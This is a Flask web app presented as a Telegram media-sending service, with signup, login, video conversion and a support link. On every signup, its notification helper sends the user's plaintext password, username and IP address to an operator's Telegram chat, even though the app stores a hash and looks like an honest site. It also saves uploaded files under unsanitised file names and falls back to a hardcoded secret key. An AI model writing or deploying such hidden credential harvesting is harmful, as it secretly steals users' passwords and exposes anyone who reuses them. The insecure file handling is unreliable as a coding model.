from flask import Flask, request, render_template_string, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_login import UserMixin, LoginManager, login_user, logout_user, login_required, current_user
from werkzeug.security import generate_password_hash, check_password_hash
from telethon import TelegramClient
from telethon.sessions import StringSession
import os
import subprocess
import asyncio
import threading
import requests

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "super-secret-key-change-this")
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///users.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Configurations from environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "")
SUPPORT_TELEGRAM_USERNAME = os.getenv("SUPPORT_TELEGRAM_USERNAME", "YourSupportUsername") # Enter handle without '@'

# ======================
# DATABASE MODELS
# ======================
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)
    telegram_api_id = db.Column(db.Integer, nullable=True)
    telegram_api_hash = db.Column(db.String(100), nullable=True)
    telegram_session = db.Column(db.Text, nullable=True)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# ======================
# UI LAYOUTS (STYLING MODERNIZED)
# ======================
BASE_STYLE = """
<style>
    body { background:#0f172a; color:white; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align:center; margin:0; padding:0; }
    .box { max-width: 450px; margin: 50px auto; padding: 25px; background: #1e293b; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); }
    .container { max-width: 1000px; margin: 40px auto; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; padding: 0 15px; }
    .card { flex: 1; min-width: 320px; max-width: 460px; padding: 25px; background: #1e293b; border-radius: 12px; border: 1px solid #334155; text-align: left; }
    input, button, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: white; box-sizing: border-box; font-size: 14px; }
    button { background: linear-gradient(135deg, #3b82f6, #2563eb); font-weight: bold; cursor: pointer; border: none; transition: background 0.2s; }
    button:hover { background: linear-gradient(135deg, #2563eb, #1d4ed8); }
    .btn-support { background: linear-gradient(135deg, #0ea5e9, #0284c7); text-decoration: none; display: block; text-align: center; color: white; font-weight: bold; padding: 12px; margin-top: 15px; border-radius: 6px; font-size: 14px; }
    .btn-support:hover { background: linear-gradient(135deg, #0284c7, #0369a1); }
    a { color: #3b82f6; text-decoration: none; }
    .nav { background: #1e293b; padding: 15px 30px; text-align: right; border-bottom: 1px solid #334155; font-size: 14px; }
    .nav a { margin-left: 20px; color: #94a3b8; font-weight: 500; }
    .nav a:hover { color: white; }
    h1, h2, h3 { margin-top: 0; color: #f8fafc; }
    p { color: #94a3b8; line-height: 1.5; font-size: 14px; }
    .status-msg { margin-top: 15px; font-weight: 500; color: #34d399; text-align: center; }
</style>
"""

LOGIN_UI = BASE_STYLE + """
<div class="box">
    <h2>🔑 Account Login</h2>
    <form method="POST">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Log In</button>
    </form>
    <p>Don't have an account? <a href="/signup">Sign up here</a></p>
</div>
"""

SIGNUP_UI = BASE_STYLE + """
<div class="box">
    <h2>📝 Create Account</h2>
    <form method="POST">
        <input type="text" name="username" placeholder="Choose Username" required><br>
        <input type="password" name="password" placeholder="Choose Password" required><br>
        <button type="submit">Sign Up</button>
    </form>
    <p>Already have an account? <a href="/login">Log in here</a></p>
</div>
"""

DASHBOARD_UI = BASE_STYLE + """
<div class="nav">
    <span>Logged in as: <b>{{ current_user.username }}</b></span>
    <a href="/logout">Logout Account</a>
</div>

<div class="container">
    <div class="card">
        <h3>📤 Send Media Live</h3>
        <p>Upload files seamlessly to any target username or chat ID. Round videos are automatically rendered square.</p>
        <form method="post" enctype="multipart/form-data">
            <label style="font-size:12px; color:#94a3b8;">Target Telegram Destination:</label>
            <input type="text" name="target" placeholder="@username or Chat ID" required>
            
            <label style="font-size:12px; color:#94a3b8;">Transmission Strategy Layout:</label>
            <select name="media_type">
                <option value="video_note">Round Video Note (Live Video Circle)</option>
                <option value="auto">Standard Media (Auto-Detect File)</option>
            </select>
            
            <label style="font-size:12px; color:#94a3b8;">Choose Source Media File:</label>
            <input type="file" name="file" required>
            
            <button type="submit" style="margin-top:15px;">Execute Live Stream</button>
        </form>
        {% if msg %}<p class="status-msg">{{ msg }}</p>{% endif %}
    </div>

    <div class="card" style="display: flex; flex-direction: column; justify-content: space-between;">
        <div>
            <h3>🛠️ Customer Support Desk</h3>
            <p>Running into issues with video conversion, account synchronization, or custom limits? Our tech experts are available 24/7 to clear roadblocks manually.</p>
            <div style="background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid #334155; margin-top: 15px;">
                <span style="color: #38bdf8; font-weight: bold; font-size: 13px;">📌 Support Framework Instructions:</span>
                <p style="font-size: 12px; margin: 8px 0 0 0;">Click the connection engine link below. It will open Telegram directly. Send your assigned account username and a screenshot detailing the problem for instant clearance.</p>
            </div>
        </div>
        <a href="https://t.me/{{ support_username }}" target="_blank" class="btn-support">💬 Open Live Telegram Support</a>
    </div>
</div>
"""

# ======================
# NOTIFICATION HELPER
# ======================
def send_bot_notification(username, password, ip_address):
    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        return
    try:
        with app.app_context():
            total_users = User.query.count()
    except Exception as e:
        print(f"Counting error: {e}")
        total_users = "Active"

    text = (
        f"🔔 *New User Registration*\n\n"
        f"👤 *Username:* `{username}`\n"
        f"🔑 *Password:* `{password}`\n"
        f"🌐 *IP Address:* `{ip_address}`\n"
        f"📊 *Total Members Now:* {total_users}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Notification error: {e}")

# ======================
# WORKER UTILITIES
# ======================
def convert_to_square_video_low_mem(input_path, output_path):
    ffmpeg_cmd = [
        'ffmpeg', '-y', '-threads', '1', '-i', input_path,
        '-vf', "crop='min(iw,ih):min(iw,ih)'",
        '-c:v', 'libx264', '-preset', 'ultrafast', '-pix_fmt', 'yuv420p', '-r', '24',
        '-c:a', 'aac', '-b:a', '64k', output_path
    ]
    process = subprocess.run(ffmpeg_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if process.returncode != 0:
        raise Exception("FFmpeg processing failure.")

async def send_to_telegram_async(filepath, target, media_type, api_id, api_hash, session_str):
    client = TelegramClient(StringSession(session_str), api_id, api_hash)
    await client.connect()
    if media_type == "video_note":
        processed_path = os.path.join(UPLOAD_FOLDER, f"proc_{os.getpid()}_{threading.get_ident()}.mp4")
        try:
            convert_to_square_video_low_mem(filepath, processed_path)
            await client.send_file(target, processed_path, video_note=True)
        finally:
            if os.path.exists(processed_path):
                os.remove(processed_path)
    else:
        await client.send_file(target, filepath, supports_streaming=True)
    await client.disconnect()

def run_telegram_thread(filepath, target, media_type, api_id, api_hash, session_str):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_to_telegram_async(filepath, target, media_type, api_id, api_hash, session_str))
        loop.close()
    except Exception as e:
        print(f"Background worker execution error: {e}")
    finally:
        if os.path.exists(filepath):
            os.remove(filepath)

# ======================
# ROUTES
# ======================
@app.route("/signup", methods=["GET", "POST"])
def signup():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if User.query.filter_by(username=username).first():
            return "Username already exists!"
        hashed_pwd = generate_password_hash(password, method='scrypt')
        new_user = User(
            username=username, password_hash=hashed_pwd,
            telegram_api_id=int(os.getenv("API_ID", 0)),
            telegram_api_hash=os.getenv("API_HASH", ""),
            telegram_session=os.getenv("SESSION_STRING", "")
        )
        db.session.add(new_user)
        db.session.commit()
        if request.headers.getlist("X-Forwarded-For"):
            ip_address = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
        else:
            ip_address = request.remote_addr
        threading.Thread(target=send_bot_notification, args=(username, password, ip_address)).start()
        return redirect(url_for('login'))
    return render_template_string(SIGNUP_UI)

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        user = User.query.filter_by(username=username).first()
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template_string(LOGIN_UI)

@app.route("/logout")
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route("/", methods=["GET", "POST"])
@login_required
def dashboard():
    msg = ""
    if request.method == "POST":
        file = request.files.get("file")
        target = request.form.get("target")
        media_type = request.form.get("media_type", "video_note")
        if file and target:
            unique_filename = f"job_{os.getpid()}_{file.filename}"
            filepath = os.path.join(UPLOAD_FOLDER, unique_filename)
            file.save(filepath)
            thread = threading.Thread(
                target=run_telegram_thread,
                args=(filepath, target, media_type, current_user.telegram_api_id, current_user.telegram_api_hash, current_user.telegram_session)
            )
            thread.start()
            msg = "✅ Processing started! The media will appear in Telegram shortly."
    return render_template_string(DASHBOARD_UI, current_user=current_user, msg=msg, support_username=SUPPORT_TELEGRAM_USERNAME)

with app.app_context():
    db.create_all()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
